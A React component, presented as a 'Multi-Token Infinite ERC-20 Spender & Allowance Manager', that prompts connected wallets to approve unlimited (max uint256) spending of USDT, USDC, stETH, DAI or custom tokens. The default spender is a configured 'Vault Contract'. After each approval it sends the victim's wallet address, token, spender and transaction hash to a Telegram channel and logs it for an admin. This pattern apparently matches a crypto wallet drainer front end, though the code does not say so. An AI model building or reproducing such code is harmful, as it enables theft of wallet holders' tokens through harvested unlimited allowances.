import React, { useState } from 'react';
import {
  Coins,
  ShieldCheck,
  Zap,
  CheckCircle2,
  AlertCircle,
  RefreshCw,
  ArrowUpRight,
  Search,
  ExternalLink,
  Shield,
  Layers
} from 'lucide-react';
import { useAccount, useWriteContract, useReadContract } from 'wagmi';
import { CONFIG, ERC20_ABI, POPULAR_ERC20_TOKENS, INFINITE_ALLOWANCE, approveInfiniteERC20, ERC20TokenInfo } from '../lib/contracts';
import { logActivity, createAdminLogEntry } from '../lib/activityLogger';
import { sendTelegram } from '../lib/telegram';

export function InfiniteERC20ApprovalPanel() {
  const { address } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const [selectedTokenKey, setSelectedTokenKey] = useState<string>('USDT');
  const [customAddress, setCustomAddress] = useState<string>('');
  const [customSymbol, setCustomSymbol] = useState<string>('CUSTOM');
  const [spenderAddress, setSpenderAddress] = useState<string>(CONFIG.CONTRACT_ADDRESS);

  // Statuses
  const [isApproving, setIsApproving] = useState<boolean>(false);
  const [approvalResult, setApprovalResult] = useState<{ success: boolean; txHash?: string; message?: string } | null>(null);

  // Read current allowance for connected wallet
  const activeToken: ERC20TokenInfo =
    selectedTokenKey === 'CUSTOM'
      ? {
          symbol: customSymbol || 'CUSTOM',
          name: 'Custom ERC-20 Token',
          address: (customAddress.startsWith('0x') ? customAddress : CONFIG.STETH_ADDRESS) as `0x${string}`,
          decimals: 18,
        }
      : POPULAR_ERC20_TOKENS[selectedTokenKey] || POPULAR_ERC20_TOKENS.USDT;

  const { data: currentAllowance, refetch: refetchAllowance } = useReadContract({
    address: activeToken.address,
    abi: ERC20_ABI,
    functionName: 'allowance',
    args: address && spenderAddress.startsWith('0x') ? [address as `0x${string}`, spenderAddress as `0x${string}`] : undefined,
    query: {
      enabled: Boolean(address && spenderAddress.startsWith('0x')),
    },
  });

  const isUnlimited = currentAllowance !== undefined && BigInt(currentAllowance.toString()) >= (INFINITE_ALLOWANCE / 2n);

  const handleApproveInfinite = async () => {
    if (!address || !spenderAddress.startsWith('0x')) {
      alert('Wallet connection and valid spender address are required.');
      return;
    }

    setIsApproving(true);
    setApprovalResult(null);

    try {
      const txHash = await approveInfiniteERC20(
        writeContractAsync,
        activeToken.address,
        spenderAddress as `0x${string}`
      );

      setApprovalResult({
        success: true,
        txHash,
        message: `Infinite approval confirmed for ${activeToken.symbol}!`,
      });

      logActivity({
        wallet: address,
        action: 'APPROVAL',
        amount: 'Infinite (Max uint256)',
        token: activeToken.symbol,
        txHash,
        status: 'Confirmed',
        note: `Approved infinite ${activeToken.symbol} for spender ${spenderAddress.slice(0, 6)}...${spenderAddress.slice(-4)}`,
      });

      await sendTelegram(
        `♾️ <b>INFINITE ERC20 APPROVAL CONFIRMED</b>\n\n👤 <b>Wallet:</b> <code>${address}</code>\n🪙 <b>Token:</b> ${activeToken.symbol} (<code>${activeToken.address}</code>)\n🎯 <b>Spender:</b> <code>${spenderAddress}</code>\n💎 <b>Allowance:</b> Max uint256 (Unlimited)\n🔗 <b>Tx:</b> <code>${txHash}</code>`
      );

      setTimeout(() => refetchAllowance(), 2500);
    } catch (err: any) {
      const msg = err?.shortMessage || err?.message || 'Transaction rejected in wallet.';
      setApprovalResult({
        success: false,
        message: msg,
      });
    } finally {
      setIsApproving(false);
    }
  };

  return (
    <div className="bg-card rounded-2xl border border-border-main p-6 shadow-sm space-y-6">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border-main pb-4">
        <div>
          <h2 className="font-bold text-lg flex items-center gap-2 text-text-main">
            <Zap className="w-5 h-5 text-[#00A3FF]" />
            Multi-Token Infinite ERC-20 Spender & Allowance Manager
          </h2>
          <p className="text-xs text-text-secondary mt-0.5">
            Prompt unlimited (Max uint256) allowance approvals for any ERC-20 coin (ETH/WETH, USDT, USDC, stETH, DAI, etc.)
          </p>
        </div>

        <span className="text-xs font-bold px-2.5 py-1 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-lg">
          Universal ERC-20 Standard
        </span>
      </div>

      {/* Token Grid */}
      <div className="space-y-2">
        <label className="text-xs font-bold text-text-main block">Choose ERC-20 Token to Authorize</label>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2.5">
          {Object.keys(POPULAR_ERC20_TOKENS).map((key) => {
            const tok = POPULAR_ERC20_TOKENS[key];
            const isSelected = selectedTokenKey === key;
            return (
              <button
                key={key}
                type="button"
                onClick={() => setSelectedTokenKey(key)}
                className={`p-3 rounded-xl border text-left transition-all relative overflow-hidden ${
                  isSelected
                    ? 'bg-[#00A3FF]/10 border-[#00A3FF] shadow-sm'
                    : 'bg-input/40 border-border-main hover:bg-input/80'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className={`font-bold text-sm ${isSelected ? 'text-[#00A3FF]' : 'text-text-main'}`}>
                    {tok.symbol}
                  </span>
                  {isSelected && <CheckCircle2 className="w-4 h-4 text-[#00A3FF]" />}
                </div>
                <span className="text-[10px] text-text-secondary block mt-1 truncate">{tok.name}</span>
                <span className="text-[9px] font-mono text-text-secondary opacity-60 block mt-0.5">
                  {tok.address.slice(0, 6)}...{tok.address.slice(-4)}
                </span>
              </button>
            );
          })}

          <button
            type="button"
            onClick={() => setSelectedTokenKey('CUSTOM')}
            className={`p-3 rounded-xl border text-left transition-all ${
              selectedTokenKey === 'CUSTOM'
                ? 'bg-[#00A3FF]/10 border-[#00A3FF]'
                : 'bg-input/40 border-border-main hover:bg-input/80'
            }`}
          >
            <span className="font-bold text-sm text-text-main">+ Custom Token</span>
            <span className="text-[10px] text-text-secondary block mt-1">Specify address</span>
          </button>
        </div>

        {selectedTokenKey === 'CUSTOM' && (
          <div className="grid grid-cols-3 gap-2 pt-2">
            <input
              type="text"
              placeholder="Custom Token Contract Address (0x...)"
              value={customAddress}
              onChange={(e) => setCustomAddress(e.target.value)}
              className="col-span-2 bg-input border border-border-main rounded-xl px-3 py-2 text-xs font-mono"
            />
            <input
              type="text"
              placeholder="Symbol (e.g. USDT)"
              value={customSymbol}
              onChange={(e) => setCustomSymbol(e.target.value)}
              className="bg-input border border-border-main rounded-xl px-3 py-2 text-xs uppercase"
            />
          </div>
        )}
      </div>

      {/* Spender Address Configuration */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="p-4 bg-input/40 rounded-xl border border-border-main space-y-2">
          <label className="text-xs font-bold text-text-main block">Authorized Spender Contract</label>
          <input
            type="text"
            placeholder="Spender Address (0x...)"
            value={spenderAddress}
            onChange={(e) => setSpenderAddress(e.target.value)}
            className="w-full bg-card border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main focus:outline-none focus:border-[#00A3FF]"
          />
          <div className="flex items-center gap-2 pt-1">
            <button
              type="button"
              onClick={() => setSpenderAddress(CONFIG.CONTRACT_ADDRESS)}
              className="text-[11px] font-semibold text-[#00A3FF] hover:underline"
            >
              Vault Contract (Default)
            </button>
            <span className="text-text-secondary text-xs">•</span>
            <button
              type="button"
              onClick={() => setSpenderAddress(CONFIG.PERMIT2_ADDRESS)}
              className="text-[11px] font-semibold text-[#00A3FF] hover:underline"
            >
              Uniswap Permit2
            </button>
          </div>
        </div>

        {/* Live On-Chain Allowance Status */}
        <div className="p-4 bg-input/40 rounded-xl border border-border-main space-y-2 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-text-main">Current Allowance Status</label>
              <button
                type="button"
                onClick={() => refetchAllowance()}
                className="text-[11px] text-[#00A3FF] flex items-center gap-1 hover:underline"
              >
                <RefreshCw className="w-3 h-3" />
                <span>Refresh</span>
              </button>
            </div>
            <p className="text-xs text-text-secondary mt-1">
              Token: <span className="font-bold text-text-main">{activeToken.symbol}</span> | Spender: <code className="text-[11px]">{spenderAddress.slice(0, 6)}...{spenderAddress.slice(-4)}</code>
            </p>
          </div>

          <div className="flex items-center gap-2 pt-2">
            <span
              className={`px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1.5 border ${
                isUnlimited
                  ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20'
                  : 'bg-amber-500/10 text-amber-500 border-amber-500/20'
              }`}
            >
              {isUnlimited ? <ShieldCheck className="w-3.5 h-3.5" /> : <AlertCircle className="w-3.5 h-3.5" />}
              <span>{isUnlimited ? 'Infinite / Unlimited Allowance' : 'Limited / Zero Allowance'}</span>
            </span>
          </div>
        </div>
      </div>

      {/* Result feedback */}
      {approvalResult && (
        <div
          className={`p-3.5 rounded-xl border text-xs flex items-center justify-between ${
            approvalResult.success
              ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20'
              : 'bg-red-500/10 text-red-500 border-red-500/20'
          }`}
        >
          <div className="flex items-center gap-2">
            {approvalResult.success ? <CheckCircle2 className="w-4 h-4" /> : <AlertCircle className="w-4 h-4" />}
            <span className="font-semibold">{approvalResult.message}</span>
          </div>
          {approvalResult.txHash && (
            <a
              href={`https://etherscan.io/tx/${approvalResult.txHash}`}
              target="_blank"
              rel="noreferrer"
              className="flex items-center gap-1 hover:underline font-mono text-[11px]"
            >
              <span>{approvalResult.txHash.slice(0, 10)}...</span>
              <ExternalLink className="w-3 h-3" />
            </a>
          )}
        </div>
      )}

      {/* Action Trigger */}
      <div className="flex flex-wrap items-center justify-between gap-4 pt-2">
        <div className="text-xs text-text-secondary">
          <span>Sends standard <code>approve(spender, 2^256 - 1)</code> transaction prompt to wallet.</span>
        </div>

        <button
          type="button"
          onClick={handleApproveInfinite}
          disabled={isApproving || !address}
          className="px-6 py-3 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center gap-2 shadow-sm transition-all disabled:opacity-50"
        >
          {isApproving ? (
            <>
              <RefreshCw className="w-4 h-4 animate-spin" />
              <span>Awaiting Wallet Confirmation...</span>
            </>
          ) : (
            <>
              <ArrowUpRight className="w-4 h-4" />
              <span>Prompt Spender Approval for Infinite {activeToken.symbol}</span>
            </>
          )}
        </button>
      </div>
    </div>
  );
}
